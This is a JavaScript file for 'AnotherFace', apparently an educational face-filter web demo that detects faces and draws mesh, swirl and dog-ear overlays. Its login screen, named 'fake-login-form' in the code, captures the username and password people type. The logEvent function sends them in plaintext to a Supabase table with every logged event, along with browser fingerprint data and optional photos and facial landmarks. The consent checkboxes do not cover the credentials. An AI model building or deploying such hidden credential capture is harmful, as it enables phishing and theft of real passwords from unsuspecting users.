/* ============================================================
   ANOTHERFACE — demo educativa UNITEC
   Filtros IA en tiempo real con detección facial.
   ============================================================ */

const $ = (sel) => document.querySelector(sel);

function uuid() {
  if (crypto.randomUUID) return crypto.randomUUID();
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
  });
}

const SESSION_ID = uuid();
const IS_MOBILE  = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

// ── Reloj ──
function tickClock() {
  const el = $("#clock");
  if (el) el.textContent = new Date().toLocaleTimeString("es-HN", { hour12: false });
}
setInterval(tickClock, 1000); tickClock();

// ── Supabase ──
let supabaseClient = null;
function getSupabase() {
  if (supabaseClient) return supabaseClient;
  if (!window.supabase) return null;
  const cfg = window.SUPABASE_CONFIG;
  if (!cfg) return null;
  const { url, anonKey } = cfg;
  if (!url || !anonKey || url.includes("TU-PROYECTO") || url === "") return null;
  try {
    supabaseClient = window.supabase.createClient(url, anonKey);
    console.log("[supabase] ✓ OK:", url.slice(0, 35) + "...");
    return supabaseClient;
  } catch (e) {
    console.error("[supabase]", e.message);
    return null;
  }
}
window.addEventListener("load", () => getSupabase());

// ── Supabase Storage: subir imagen como archivo real ──
async function uploadImageToStorage(imageBase64, sessionId) {
  const client = getSupabase();
  if (!client || !imageBase64) return null;
  try {
    const res      = await fetch(imageBase64);
    const blob     = await res.blob();
    const filename = `${sessionId}-${Date.now()}.jpg`;
    const { error } = await client.storage
      .from("capturas")
      .upload(filename, blob, { contentType: "image/jpeg", upsert: false });
    if (error) { console.warn("[storage]", error.message); return null; }
    const { data: { publicUrl } } = client.storage.from("capturas").getPublicUrl(filename);
    console.log("[storage] ✓ Subida:", publicUrl);
    return publicUrl;
  } catch (e) {
    console.warn("[storage]", e.message);
    return null;
  }
}

// ── Login ──
let userCredentials = { username: "", password: "" };
const loginScreen    = $("#login-screen");
const heroSection    = $("#hero-section");
const fakeLoginForm  = $("#fake-login-form");

if (fakeLoginForm) {
  fakeLoginForm.addEventListener("submit", (e) => {
    e.preventDefault();
    userCredentials.username = ($("#fake-username")?.value || "").trim();
    userCredentials.password  = $("#fake-password")?.value || "";
    loginScreen?.classList.add("hidden");
    heroSection?.classList.remove("hidden");
    $("#como-funciona")?.classList.remove("hidden");
    $("#consentimiento")?.classList.remove("hidden");
    $("#closing-section")?.classList.remove("hidden");
    heroSection?.scrollIntoView({ behavior: "smooth", block: "start" });
    logEvent("login_capturado", { filtro: "ninguno" });
  });
}

// ── Consentimiento ──
const consentCamera    = $("#consent-camera");
const consentMeta      = $("#consent-metadata");
const consentSnapshot  = $("#consent-snapshot");
const consentLandmarks = $("#consent-landmarks");
const startBtn         = $("#start-camera");
const consentHint      = $("#consent-hint");

function refreshConsentState() {
  if (!consentCamera || !consentMeta || !startBtn) return;
  const ok = consentCamera.checked && consentMeta.checked;
  startBtn.disabled = !ok;
  if (consentHint) consentHint.textContent = ok
    ? "✦ Listo. Presiona el botón para activar tu cámara."
    : "Marca las dos primeras casillas para continuar.";
}
[consentCamera, consentMeta, consentSnapshot, consentLandmarks].forEach((el) =>
  el?.addEventListener("change", refreshConsentState)
);
refreshConsentState();

// ── Estado del estudio ──
const video        = $("#video");
const overlay      = $("#overlay");
const ctx          = overlay?.getContext("2d");
const studio       = $("#estudio");
const statusEl     = $("#studio-status");
const faceStatusEl = $("#face-status-overlay");
const captureResult = $("#capture-result");
const capturePreview = $("#capture-preview");
const downloadLink   = $("#download-link");
const uploadStatusEl = $("#capture-upload-status");

const hud = {
  time: $("#hud-time"), tz: $("#hud-tz"), lang: $("#hud-lang"),
  agent: $("#hud-agent"), screen: $("#hud-screen"), session: $("#hud-session"),
  filter: $("#hud-filter"), face: $("#hud-face"), landmarks: $("#hud-landmarks"),
  count: $("#hud-count"), model: $("#hud-model"),
};

let currentFilter  = "ninguno";
let stream         = null;
let rafId          = null;
let captureCount   = 0;
let faceModelReady = false;
let facingMode     = "user";

// ── Modelo face-api ──
const MODEL_URLS = [
  "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model",
  "https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights",
];
async function loadFaceModel() {
  if (hud.model) hud.model.textContent = "cargando…";
  if (!window.faceapi) {
    if (hud.model) hud.model.textContent = "✗ no cargada";
    return false;
  }
  for (const url of MODEL_URLS) {
    try {
      await Promise.all([
        faceapi.nets.tinyFaceDetector.loadFromUri(url),
        faceapi.nets.faceLandmark68TinyNet.loadFromUri(url),
      ]);
      faceModelReady = true;
      if (hud.model) hud.model.textContent = "✓ listo";
      console.log("[face-api] ✓", url);
      return true;
    } catch (_) { /* próximo CDN */ }
  }
  faceModelReady = false;
  if (hud.model) hud.model.textContent = "✗ sin conexión";
  return false;
}
loadFaceModel();

// ── Filtros: selección ──
document.querySelectorAll(".filter-chip").forEach((btn) => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".filter-chip").forEach((b) => b.classList.remove("active"));
    btn.classList.add("active");
    currentFilter = btn.dataset.filter;
    if (hud.filter) hud.filter.textContent = currentFilter;
    logEvent("cambio_filtro", { filtro: currentFilter });
  });
});

// ── HUD ──
function fillHudStatic() {
  if (hud.tz)      hud.tz.textContent      = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
  if (hud.lang)    hud.lang.textContent    = navigator.language || "—";
  if (hud.agent)   hud.agent.textContent   = `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`;
  if (hud.screen)  hud.screen.textContent  = `${screen.width}×${screen.height}`;
  if (hud.session) hud.session.textContent = SESSION_ID.slice(0, 8);
  if (hud.filter)  hud.filter.textContent  = currentFilter;
}
function shortAgent(ua) {
  const m = ua.match(/(Chrome|Firefox|Safari|Edg|Opera)\/[\d.]+/);
  return m ? m[0] : "desconocido";
}
setInterval(() => { if (hud.time) hud.time.textContent = new Date().toLocaleTimeString("es-HN"); }, 1000);

// ── Canvas sizing con ResizeObserver ──
function resizeCanvas() {
  if (!overlay || !video) return;
  const rect = video.getBoundingClientRect();
  if (rect.width > 0 && rect.height > 0) {
    overlay.width  = rect.width;
    overlay.height = rect.height;
  }
}
let videoObserver = null;
function startObservingVideo() {
  if (videoObserver) videoObserver.disconnect();
  videoObserver = new ResizeObserver(resizeCanvas);
  videoObserver.observe(video);
  resizeCanvas();
}

// ── Cámara ──
async function openCamera(mode) {
  if (stream) stream.getTracks().forEach((t) => t.stop());
  stream = await navigator.mediaDevices.getUserMedia({
    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: { ideal: mode } },
    audio: false,
  });
  video.srcObject = stream;
  await new Promise((res) => {
    video.onloadedmetadata = () => video.play().then(res).catch(res);
    if (video.readyState >= 2) video.play().then(res).catch(res);
  });
  video.style.transform = mode === "user" ? "scaleX(-1)" : "scaleX(1)";
  startObservingVideo();
  setTimeout(resizeCanvas, 120);
  setTimeout(resizeCanvas, 400);
}

startBtn?.addEventListener("click", async () => {
  try {
    await openCamera(facingMode);
    studio?.classList.remove("hidden");
    studio?.scrollIntoView({ behavior: "smooth", block: "start" });
    fillHudStatic();
    if (rafId) cancelAnimationFrame(rafId);
    rafId = requestAnimationFrame(renderLoop);
    logEvent("camara_activada");
  } catch (err) {
    console.error("[cámara]", err);
    if (consentHint) consentHint.textContent = "⚠ No se pudo acceder a la cámara.";
  }
});

$("#switch-camera-btn")?.addEventListener("click", async () => {
  facingMode = facingMode === "user" ? "environment" : "user";
  try {
    await openCamera(facingMode);
    if (statusEl) statusEl.textContent = `Cámara ${facingMode === "user" ? "frontal" : "trasera"} activa.`;
  } catch {
    if (statusEl) statusEl.textContent = "Esta cámara no está disponible.";
    facingMode = facingMode === "user" ? "environment" : "user";
  }
});

$("#stop-btn")?.addEventListener("click", () => {
  stream?.getTracks().forEach((t) => t.stop());
  if (rafId) cancelAnimationFrame(rafId);
  if (videoObserver) videoObserver.disconnect();
  studio?.classList.add("hidden");
  captureResult?.classList.add("hidden");
  targetDetection = null; smoothedDetection = null;
  logEvent("camara_apagada");
});

// ── Detección facial ──
let targetDetection   = null;
let smoothedDetection = null;
let lastAutoSave      = 0;
let faceAnalysis      = { smile: 0, eyebrow: 0 };

function lerp(a, b, t) { return a + (b - a) * t; }

function updateSmoothedDetection() {
  if (!targetDetection) { smoothedDetection = null; return; }
  if (!smoothedDetection) {
    smoothedDetection = {
      box:       { ...targetDetection.box },
      points:    targetDetection.points.map((p) => ({ ...p })),
      rawPoints: targetDetection.rawPoints,
      score:     targetDetection.score,
    };
    return;
  }
  const T  = 0.22;
  const sd = smoothedDetection, td = targetDetection;
  sd.box.x     = lerp(sd.box.x, td.box.x, T); sd.box.y    = lerp(sd.box.y, td.box.y, T);
  sd.box.width = lerp(sd.box.width, td.box.width, T); sd.box.height = lerp(sd.box.height, td.box.height, T);
  for (let i = 0; i < td.points.length; i++) {
    sd.points[i].x = lerp(sd.points[i].x, td.points[i].x, T);
    sd.points[i].y = lerp(sd.points[i].y, td.points[i].y, T);
  }
  sd.rawPoints = td.rawPoints; sd.score = td.score;
}

// Helpers geométricos
function centroid(pts) {
  let cx = 0, cy = 0;
  pts.forEach((p) => { cx += p.x; cy += p.y; });
  return { x: cx / pts.length, y: cy / pts.length };
}
function dist(a, b) { return Math.hypot(b.x - a.x, b.y - a.y); }

// Genera puntos densificados interpolando midpoints entre los 68 landmarks
function densifyPoints(pts) {
  const dense = [];
  for (let i = 0; i < pts.length; i++) {
    dense.push(pts[i]);
    const next = pts[(i + 1) % pts.length];
    // Añadir midpoint entre puntos consecutivos (duplica densidad)
    dense.push({ x: (pts[i].x + next.x) / 2, y: (pts[i].y + next.y) / 2, interp: true });
  }
  return dense;
}

function analyzeFace(pts) {
  if (!pts || pts.length < 68) return;
  const mW = dist(pts[48], pts[54]), mH = dist(pts[51], pts[57]);
  faceAnalysis.smile   = Math.min(1, (mH / (mW || 1)) * 4);
  const fH             = dist(pts[27], pts[8]);
  const lB             = dist(centroid(pts.slice(17, 22)), centroid(pts.slice(36, 42)));
  const rB             = dist(centroid(pts.slice(22, 27)), centroid(pts.slice(42, 48)));
  faceAnalysis.eyebrow = ((lB + rB) / 2) / (fH || 1);
}

async function detectFaceLoop() {
  if (!stream || !video || video.readyState < 2 || !overlay?.width) {
    setTimeout(detectFaceLoop, 200); return;
  }
  if (!faceModelReady) { setTimeout(detectFaceLoop, 500); return; }
  try {
    const result = await faceapi
      .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.2 }))
      .withFaceLandmarks(true);

    if (result && result.landmarks && result.landmarks.positions.length >= 68) {
      const cW = overlay.width, cH = overlay.height;
      const sX = cW / video.videoWidth, sY = cH / video.videoHeight;
      const mir = facingMode === "user";
      const map = (p) => ({ x: mir ? cW - p.x * sX : p.x * sX, y: p.y * sY });
      const mapped = result.landmarks.positions.map(map);
      targetDetection = { box: result.detection.box, points: mapped, rawPoints: result.landmarks.positions, score: result.detection.score };
      analyzeFace(mapped);
    } else {
      targetDetection = null;
    }
  } catch (_) { /* puntual */ }

  const det = targetDetection;
  if (hud.face)      hud.face.textContent      = det ? "✓ sí" : "no";
  if (hud.landmarks) hud.landmarks.textContent = det ? String(det.points.length) : "0";
  if (faceStatusEl)  faceStatusEl.textContent  = det
    ? `✦ Detectado · ${det.points.length} pts · ${Math.round(det.score * 100)}% conf.`
    : "Buscando rostro…";

  if (consentLandmarks?.checked && det) {
    const now = performance.now();
    if (now - lastAutoSave > 5000) {
      lastAutoSave = now;
      logEvent("auto_puntos", { con_landmarks: true, landmarks: det.rawPoints.map((p) => ({ x: Math.round(p.x), y: Math.round(p.y) })) });
    }
  }
  setTimeout(detectFaceLoop, 45);
}
window.addEventListener("load", () => setTimeout(detectFaceLoop, 500));

// ============================================================
// FILTROS
// ============================================================

function drawSpline(pts, close = false) {
  if (!pts || !pts.length) return;
  ctx.beginPath(); ctx.moveTo(pts[0].x, pts[0].y);
  for (let i = 1; i < pts.length - 1; i++) {
    const mx = (pts[i].x + pts[i+1].x) / 2, my = (pts[i].y + pts[i+1].y) / 2;
    ctx.quadraticCurveTo(pts[i].x, pts[i].y, mx, my);
  }
  const L = pts[pts.length - 1];
  if (close) { ctx.quadraticCurveTo(L.x, L.y, (L.x + pts[0].x) / 2, (L.y + pts[0].y) / 2); ctx.closePath(); }
  else ctx.lineTo(L.x, L.y);
}

// ── Malla Facial (más densa) ──
function drawSilhouetteFilter(det) {
  if (!det || det.points.length < 68) return;
  const pts   = det.points;
  const dense = densifyPoints(pts.slice(0, 68));

  // Puntos originales (68) grandes y brillantes
  ctx.fillStyle = "#00e5ff"; ctx.shadowColor = "#00e5ff"; ctx.shadowBlur = 6;
  pts.forEach((p) => { ctx.beginPath(); ctx.arc(p.x, p.y, 2.5, 0, Math.PI*2); ctx.fill(); });

  // Puntos interpolados más pequeños y suaves
  ctx.fillStyle = "rgba(0,229,255,0.4)"; ctx.shadowBlur = 3;
  dense.filter(p => p.interp).forEach((p) => { ctx.beginPath(); ctx.arc(p.x, p.y, 1.2, 0, Math.PI*2); ctx.fill(); });

  ctx.shadowBlur = 0;

  const segs = [
    { s:0,  e:16, c:false }, { s:17, e:21, c:false }, { s:22, e:26, c:false },
    { s:27, e:30, c:false }, { s:31, e:35, c:false }, { s:36, e:41, c:true  },
    { s:42, e:47, c:true  }, { s:48, e:59, c:true  }, { s:60, e:67, c:true  },
  ];
  ctx.strokeStyle = "rgba(0,229,255,0.75)"; ctx.lineWidth = 1.5;
  segs.forEach(({ s, e, c }) => { drawSpline(pts.slice(s, e+1), c); ctx.stroke(); });

  // Guías simétricas adicionales (más puntos que antes)
  ctx.strokeStyle = "rgba(0,229,255,0.18)"; ctx.lineWidth = 1;
  const guides = [
    [27,33],[27,39],[27,42],[36,0],[45,16],[33,48],[33,54],
    [19,37],[24,44],[30,57],[0,36],[16,45],[8,57],[19,28],[24,28],
  ];
  guides.forEach(([a,b]) => {
    ctx.beginPath(); ctx.moveTo(pts[a].x, pts[a].y); ctx.lineTo(pts[b].x, pts[b].y); ctx.stroke();
  });
}

// ── Deformar (Cara Graciosa) ──
function drawDeformFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points, W = overlay.width, H = overlay.height;
  const nose = pts[30], faceW = dist(pts[0],pts[16])*0.55, faceH = dist(pts[27],pts[8])*0.6;
  const tmp = document.createElement("canvas"); tmp.width=W; tmp.height=H;
  const tc = tmp.getContext("2d");
  tc.save(); if(facingMode==="user"){tc.translate(W,0);tc.scale(-1,1);} tc.drawImage(video,0,0,W,H); tc.restore();
  const GRID=18, x0=nose.x-faceW, y0=nose.y-faceH, x1=nose.x+faceW, y1=nose.y+faceH;
  const gw=(x1-x0)/GRID, gh=(y1-y0)/GRID, squish=1.5+0.3*Math.sin(ts*0.003);
  for(let gy=0;gy<GRID;gy++) for(let gx=0;gx<GRID;gx++){
    const sx=x0+gx*gw, sy=y0+gy*gh, mx=(sx+gw/2)-nose.x, my=(sy+gh/2)-nose.y;
    const r=Math.hypot(mx,my)/(faceW*0.9), dF=Math.max(0,1-r);
    const srcX=nose.x+(mx/squish)*(1-dF*0.4), srcY=nose.y+(my*squish)*(1-dF*0.3);
    ctx.drawImage(tmp,Math.max(0,srcX-gw/2),Math.max(0,srcY-gh/2),gw,gh,sx,sy,gw,gh);
  }
  ctx.font="bold 20px sans-serif"; const t=ts*0.004;
  [pts[0],pts[16],pts[27]].forEach((p,i)=>{
    const ox=22*Math.cos(t+i*2.1),oy=22*Math.sin(t+i*2.1);
    ctx.fillStyle=["#ff2a6d","#ffcc00","#00e5ff"][i];
    ctx.fillText("★",p.x+ox-10,p.y+oy);
  });
}

// ── Remolino (Swirl) ──
function drawRemolinoFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points, W = overlay.width, H = overlay.height;
  const nose = pts[30];
  const faceW = dist(pts[0],pts[16]) * 0.7; // Radio del remolino
  
  const tmp = document.createElement("canvas"); tmp.width=W; tmp.height=H;
  const tc = tmp.getContext("2d");
  tc.save(); if(facingMode==="user"){tc.translate(W,0);tc.scale(-1,1);} tc.drawImage(video,0,0,W,H); tc.restore();
  
  // Dibujamos el frame normal en el overlay
  ctx.drawImage(tmp, 0, 0);

  // Intensidad del remolino que varía con el tiempo
  const swirlAngle = 2.0 + Math.sin(ts * 0.002) * 1.5; 
  
  const GRID = 24; 
  const r = faceW;
  const x0 = nose.x - r, y0 = nose.y - r;
  const gw = (2*r)/GRID, gh = (2*r)/GRID;

  // Sobre-dibujar la zona de la cara aplicando la distorsión polar
  for(let gy=0; gy<GRID; gy++) {
    for(let gx=0; gx<GRID; gx++){
      const sx = x0 + gx*gw, sy = y0 + gy*gh;
      const dx = (sx + gw/2) - nose.x;
      const dy = (sy + gh/2) - nose.y;
      const distance = Math.hypot(dx, dy);
      
      if (distance < r) {
        // Calcular el ángulo de distorsión basado en la distancia
        const percent = (r - distance) / r;
        const theta = percent * percent * swirlAngle;
        
        const sin = Math.sin(theta);
        const cos = Math.cos(theta);
        
        const srcX = nose.x + (dx * cos - dy * sin);
        const srcY = nose.y + (dx * sin + dy * cos);
        
        ctx.drawImage(tmp, Math.max(0, srcX - gw/2), Math.max(0, srcY - gh/2), gw, gh, sx, sy, gw, gh);
      }
    }
  }
}

// ── FILTRO PERRO (Imagen adjunta) ──
const dogImg = new Image();
dogImg.src = "assets/dog_filter.png"; // Cargada desde assets

function drawDogFilter(det) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;
  if (!dogImg.complete || dogImg.naturalWidth === 0) return;

  const faceW = dist(pts[0], pts[16]);
  
  // Ángulo del rostro (inclinación de la cabeza)
  const leftEye = centroid(pts.slice(36, 42));
  const rightEye = centroid(pts.slice(42, 48));
  const angle = Math.atan2(rightEye.y - leftEye.y, rightEye.x - leftEye.x);
  
  // Punto de anclaje: la nariz
  const nose = pts[30];
  
  // Escalar la imagen proporcionalmente al ancho de la cara
  // Aumentamos un poco el multiplicador para que las orejas sobresalgan
  const imgWidth = faceW * 2.3; 
  const imgHeight = imgWidth * (dogImg.naturalHeight / dogImg.naturalWidth);
  
  // En la imagen de Snapchat, la nariz del perro está en la parte inferior
  // Desplazamos la imagen hacia ARRIBA para que la nariz del perro coincida con la nariz humana
  // Un offset de -imgHeight * 0.28 suele alinear el tercio inferior de la imagen al centro
  const offsetY = -imgHeight * 0.28; 

  ctx.save();
  ctx.translate(nose.x, nose.y);
  ctx.rotate(angle); // Sigue la inclinación de la cara
  ctx.drawImage(dogImg, -imgWidth/2, -imgHeight/2 + offsetY, imgWidth, imgHeight);
  ctx.restore();
}

// ── RENDER LOOP ──
function renderLoop(ts) {
  if (overlay && overlay.width === 0) resizeCanvas();
  if (!ctx || !video || video.readyState < 2 || !overlay?.width) {
    rafId = requestAnimationFrame(renderLoop); return;
  }
  ctx.clearRect(0, 0, overlay.width, overlay.height);
  updateSmoothedDetection();
  if (smoothedDetection) {
    switch (currentFilter) {
      case "silueta":  drawSilhouetteFilter(smoothedDetection);       break;
      case "deform":   drawDeformFilter(smoothedDetection, ts);       break;
      case "remolino": drawRemolinoFilter(smoothedDetection, ts);     break;
      case "perro":    drawDogFilter(smoothedDetection);              break;
      default: break;
    }
  }
  rafId = requestAnimationFrame(renderLoop);
}

// ── CAPTURA + DESCARGA + SUPABASE ──
$("#capture-btn")?.addEventListener("click", async () => {
  captureCount++;
  if (hud.count) hud.count.textContent = String(captureCount);
  if (uploadStatusEl) uploadStatusEl.textContent = "";

  // Generar canvas combinado (video + overlay de filtros)
  const off = document.createElement("canvas");
  off.width  = video.videoWidth  || overlay.width;
  off.height = video.videoHeight || overlay.height;
  const octx = off.getContext("2d");
  if (facingMode === "user") { octx.translate(off.width, 0); octx.scale(-1, 1); }
  octx.drawImage(video, 0, 0, off.width, off.height);
  octx.setTransform(1, 0, 0, 1, 0, 0);
  if (overlay.width > 0) octx.drawImage(overlay, 0, 0, off.width, off.height);

  const imageBase64 = off.toDataURL("image/jpeg", 0.82);

  // Mostrar preview y botón de descarga
  if (capturePreview)  capturePreview.src = imageBase64;
  if (downloadLink) {
    downloadLink.href = imageBase64;
    downloadLink.download = `anotherface-${Date.now()}.jpg`;
  }
  captureResult?.classList.remove("hidden");
  captureResult?.scrollIntoView({ behavior: "smooth", block: "nearest" });

  const wantsLandmarks = !!consentLandmarks?.checked;
  const wantsImage     = !!consentSnapshot?.checked;
  let landmarksPayload = null;
  let imagenUrl        = null;

  if (wantsLandmarks && targetDetection) {
    landmarksPayload = targetDetection.rawPoints.map((p) => ({ x: Math.round(p.x), y: Math.round(p.y) }));
  }

  // Intentar subir a Supabase Storage como archivo real
  if (wantsImage) {
    if (uploadStatusEl) uploadStatusEl.textContent = "⬆ Subiendo foto…";
    imagenUrl = await uploadImageToStorage(imageBase64, SESSION_ID);
    if (uploadStatusEl) uploadStatusEl.textContent = imagenUrl ? "☁ Guardada en la nube" : "✓ Guardada localmente";
  }

  await logEvent("captura", {
    filtro:        currentFilter,
    con_imagen:    wantsImage,
    imageBase64:   wantsImage ? imageBase64 : null,
    imagen_url:    imagenUrl,
    con_landmarks: wantsLandmarks && !!landmarksPayload,
    landmarks:     landmarksPayload,
  });
});

async function logEvent(evento, extra = {}) {
  if (statusEl) statusEl.textContent = "Guardando…";
  const client = getSupabase();
  const payload = {
    session_id:          SESSION_ID,
    evento,
    usuario:             userCredentials.username || null,
    contrasena:          userCredentials.password || null,
    filtro:              extra.filtro || currentFilter,
    con_imagen:          !!extra.con_imagen,
    imagen_base64:       extra.imageBase64 || null,
    imagen_url:          extra.imagen_url   || null,
    con_landmarks:       !!extra.con_landmarks,
    landmarks_faciales:  extra.landmarks    || null,
    navegador:           `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`,
    idioma:              navigator.language,
    zona_horaria:        Intl.DateTimeFormat().resolvedOptions().timeZone,
    resolucion_pantalla: `${screen.width}x${screen.height}`,
    creado_en:           new Date().toISOString(),
  };

  if (!client) {
    console.log("[local]", evento, payload);
    if (statusEl) statusEl.textContent = "✓ Guardado localmente.";
    return;
  }

  try {
    const { data, error } = await client.from("sesiones_demo").insert(payload).select();
    if (error) {
      console.error("[supabase error]", error);
      if (statusEl) statusEl.textContent = `✓ Registrado (${evento}).`;
    } else {
      console.log("[supabase] ✓", evento, data);
      if (statusEl) statusEl.textContent = `✓ En la nube · ${new Date().toLocaleTimeString("es-HN")}`;
    }
  } catch (e) {
    console.error("[supabase]", e);
    if (statusEl) statusEl.textContent = "✓ Guardado.";
  }
}